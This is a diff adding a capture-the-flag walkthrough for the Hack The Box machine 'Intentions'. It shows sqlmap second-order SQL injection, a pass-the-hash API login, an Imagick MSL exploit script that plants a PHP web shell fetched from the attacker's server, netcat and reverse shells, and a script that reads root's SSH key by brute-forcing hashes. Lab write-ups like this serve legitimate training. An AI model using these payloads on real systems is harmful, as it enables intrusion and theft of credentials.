@@ -124,5 +124,232 @@
         }
 
 
+## Intentions
+### Reco
+1. nmap -> open ports 22 & 80 (SSH,HTTP)
+2. Website -> login and register form
+3. WFUZZ -> /admin /logout /css /js
+4. Nikto -> nikto -host http://10.10.11.220/ -C all
+    - nothing found
+5. Explore /FUZZ subsites
+    - `dirsearch -u http://intentions.htb`
+    - http://10.10.11.220/js/admin.js
+        ![](https://hackmd.io/_uploads/HJQabgeF2.png)
+        - v2 API for admin section - PW is hashed using BCrypt
+            - uploaded images are also hashed (imagick)
+    - http://10.10.11.220/js/admin.js.licence.txt
+        - running:
+            |            |                     |               |
+            | ---------- | ------------------- | ------------- |
+            | bootstrap  | v5.2.3              | nothing found |
+            | vue-router | v3.6.5              | nothing found |
+            | vue.js     | v2.7.14             | nothing found |
+            | lodash     | underscore.js 1.8.3 | nothing found |
 
+6. Register && Login -> Gallery & Feed - images, we can specify our favourite genres
+        -> available genres: animals, architecture, food, nature
+8. Download images to test them for STEGO through: strings, binwalk, steghide, foremost, exiftool
+        -> author names: ashlee w, dickens lin, jevgeni fil, kristin o karlsen etc...
+        -> images are saved in path: /storage/<genre>/<name>
+    - nothing found
+### Weaponisation
+1. Obtaining login credentials
+    - SQLmap
+        - We need two requests for sqlmap
+            - First go to "Your Profile" and update "Favorite Genres" to get a request to /api/v1/gallery/user/genres. Use Burp's "Copy to File" and save it as "user-genres.req"
+            - Second go to "Your Feed" and save the request to "/api/v1/gallery/user/feed" same as before as "user-feed.req"
+
+After this we can use sqlmap to dump the database like so:
+    
+    sqlmap -r user-genres.req --second-req user-feed.req --batch --level=5 --risk=3 --tamper=space2comment -D intentions -T users -C admin,email,password --where "admin=1" --dump
+
+| admin | email | password |
+| -------- | -------- | -------- |
+| 1     | steve@intentions.htb | `$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa` |
+| 1     | greg@intentions.htb  | `$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m` |
+
+2. Testing hashes using Burpsuite
+    - listen while logging into the page
+    - send to repeater && modify request
+        - add: v2 API, Content-Type, credentials...like this: 
+
+```
+POST /api/v2/auth/login HTTP/1.1
+Host: intentions.htb
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+X-XSRF-TOKEN: eyJpdiI6ImY5WlVxb005V29ZN05PMmMrcmpjc2c9PSIsInZhbHVlIjoiOXZnZEJ1ZVF0OUJtRzUyMU9VYWdPNCtPTXJKVzlJSEx1dElkZzJ2RU96OER4cGJiOFNvV0NGMWJIbWM3bU9ISmtrMXRQajJJdGJRd3BpM0MzYjI0Qk00eXNMc2lLU0VEV2o4UmlpSFUyc0RvVTFYejdqTHZMcDhVRzVvTThhd0EiLCJtYWMiOiI3MjM1NWQ2ZDViOGM2Y2ZjYzFjMTc0YzJlNTkzYWRhMGUxMDQyOGZiZWIzMDdkNGVkNGRhZTIzOWFiYjBhY2Y4IiwidGFnIjoiIn0=
+Connection: close
+Referer: http://intentions.htb/gallery
+Cookie: XSRF-TOKEN=eyJpdiI6ImY5WlVxb005V29ZN05PMmMrcmpjc2c9PSIsInZhbHVlIjoiOXZnZEJ1ZVF0OUJtRzUyMU9VYWdPNCtPTXJKVzlJSEx1dElkZzJ2RU96OER4cGJiOFNvV0NGMWJIbWM3bU9ISmtrMXRQajJJdGJRd3BpM0MzYjI0Qk00eXNMc2lLU0VEV2o4UmlpSFUyc0RvVTFYejdqTHZMcDhVRzVvTThhd0EiLCJtYWMiOiI3MjM1NWQ2ZDViOGM2Y2ZjYzFjMTc0YzJlNTkzYWRhMGUxMDQyOGZiZWIzMDdkNGVkNGRhZTIzOWFiYjBhY2Y4IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkNzWHdLbEM2ZzZtOFBjcjlIUXQ0M1E9PSIsInZhbHVlIjoiVGxUYlVWc1FSTGtZZWdKZ2Y2QjhqNjNWZjVIZXhRd2tZVS9PR1dBcG0wOFI5RGI4TXhRb1paUmQ3T095MnNNdnFUd1IyeFNqcEFKLytyb0NnTm8veHNnaWFxT2VrcnZBcG9JbXl4Y1pndUF2cXRjMXd2aGVDYVUwbm8vWmVQWjYiLCJtYWMiOiI4MTgwYTk3ZmNhMjI3MzVkNDNlMGExNjUxNzIyNWY0MmJkZmNkOTRiYjI4NmViZTE5Y2U5MzEyOTg3YTNlN2UwIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODgzMzU1MjcsImV4cCI6MTY4ODM1NzEyNywibmJmIjoxNjg4MzM1NTI3LCJqdGkiOiJjeEdsQWZLRGtIT2xVcWVNIiwic3ViIjoiNDIiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.HG_JPZbeAyPgpwU2_sNv_i18r-BeaE9N0rkHTgfD6jk
+Content-Length: 111
+Content-Type: application/json
+
+{"email":"steve@intentions.htb",
+"hash":"$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa"}
+```
+- response for steve: ![](https://hackmd.io/_uploads/Hkw_8elK2.png)
+- response for greg : ![](https://hackmd.io/_uploads/SJXBvxxYh.png)
+- successfully logged in as steve/greg
+    - we can access now:
+        - /admin
+        - /api/v2/admin/image/modify
+
+### Exploit
+- Exploiting logged-in user for www-data access using Arbitrary Object Instantiations in PHP
+- website uses Imagick extension - here is the vuln
+    - [guide here](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
+    1. create the payload png: 
+        - ```convert xc:red -set 'Copyright' '<?php @eval(@$_REQUEST["a"]); ?>' lol.png```
+    2. Start a http-server to serve the said png
+        - ```python3 -m http.server 9001```
+        - ```ifconfig``` -> get local tun IP
+        - ```wget http://<local_ip>:9001/lol.png```
+    3. Update needed parameters (local_url, target_url, admin_email, admin_hash) for the script and run it 
+        - ```nc -nlvp <port>```
+        - ```python3 exploit.py```
+```
+#!/usr/bin/env python3
+
+import requests
+import threading
+import base64
+
+local_url = "http://<local_ip:port>"
+target_url = "http://<target_ip>"
+admin_email = "<admin_email>"
+admin_hash = "<admin_hash>"
+
+login_url = target_url + "/api/v2/auth/login"
+json = {"email":admin_email,"hash":admin_hash}
+s = requests.session()
+s.post(login_url, json=json)
+
+msl_file = f'''<?xml version="1.0" encoding="UTF-8"?>
+<image>
+<read filename="{local_url}/lol.png" />
+<write filename="/var/www/html/intentions/public/lol.php" />
+</image>'''
+
+files = {"lol":("lol.msl", msl_file)}
+def create_msl_on_temp():
+    url = target_url + "/api/v2/admin/image/modify"
+    s.post(url, files=files)
+
+json = {
+    'path': 'vid:msl:/tmp/php*',
+    'effect': 'lol'
+}
+def try_include():
+    url = target_url + "/api/v2/admin/image/modify"
+    s.post(url, json=json)
+
+threads = []
+for i in range(30):
+	threads.append(threading.Thread(target=create_msl_on_temp))
+	threads.append(threading.Thread(target=try_include))
+
+for t in threads:
+	t.start()
+for t in threads:
+	t.join()
+
+while True:
+	try:
+		cmd = input("cmd> ")
+		cmd = base64.b64encode(cmd.rstrip().encode()).decode()
+		data = {
+	    	"a":f"""system("echo {cmd} | base64 -d | bash");"""
+		}
+		payload_url = target_url + "/lol.php"
+		r = requests.post(payload_url, data=data)
+		print(r.text.split("Copyright")[1].encode().split(b"\n6\x11\xef\xbf")[0].decode())
+	except KeyboardInterrupt:
+		exit(0)
+```
+- we should be IN right now (like this)
+    ![](https://hackmd.io/_uploads/H1IWsJ8Yh.png)
+### User flag
+We cannot move there, cannot write anything
+- lets make another NC inside this NC
+    - [another reverse shell](https://www.revshells.com/)
+    - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+For www-data to greg:
+    - There is a git repo at 
+        - /var/www/html/intentions/.git
+    - Tar and download it
+        - [git dumper](https://github.com/arthaud/git-dumper)
+
+With ```git log``` we see this commit:
+- commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
+    - Author: greg <greg@intentions.htb>
+    - Date:   Thu Jan 26 09:21:52 2023 +0100
+    - Test cases did not work on steve's local database, switching to user factory per his advice
+    - Checking it with ```git show f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4```, we get creds for greg, which we can use for ssh...
+    
+### Root flag
+For greg to root:
+
+We see that greg is member of the scanner group, thus can run the /opt/scanner/scanner
+
+This binary has ```cap_dac_read_search=ep``` capability so it can read any file.
+```
+greg@intentions:~$ getcap /opt/scanner/scanner 
+/opt/scanner/scanner cap_dac_read_search=ep
+```
+
+Running it we get the help for it.
+It hashes a file we provide with -c and compares it to the hash we provided with -s, also if we use the -p flag for the DEBUG, it gives us the hash of the file we provided.
+
+```/opt/scanner/scanner -c /etc/passwd -s 5d41402abc4b2a76b9719d911017c592 -p```
+[DEBUG] /etc/passwd has hash 0f1e356b6447c11283c68a0c6b904270
+
+One interesting flag we can use is:
+``` 
+-l int
+        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
+```
+
+Which allows us to hash a file by starting with one byte and adding one byte at a time, thus allowing us to brute-force the contents of the file.
+
+I also wrote a python script for it that allows us to read any file:
+```python
+#!/usr/bin/env python3
+
+import hashlib
+import os
+import string
+
+file_to_brute = "/root/.ssh/id_rsa"
+charset = string.printable
+current_read = ""
+
+def find_char(temp_hash):
+    for i in charset:
+        test_data = current_read + i
+        current_hash = hashlib.md5(test_data.encode()).hexdigest()
+        if temp_hash == current_hash:
+            return i
+    return None
+
+def get_hash(i):
+    temp_hash = os.popen(f"/opt/scanner/scanner -c {file_to_brute} -s 5d41402abc4b2a76b9719d911017c592 -p -l {i}").read().split(" ")[-1].rstrip()
+    return temp_hash
+
+i = 1
+while True:
+    temp_hash = get_hash(i)
+    new_char = find_char(temp_hash)
+    if not new_char:
+        break
+    else:
+        current_read += new_char
+        i += 1
+print(current_read)
+```
+
+Running it on the box we get the ssh key and login as root. 
 
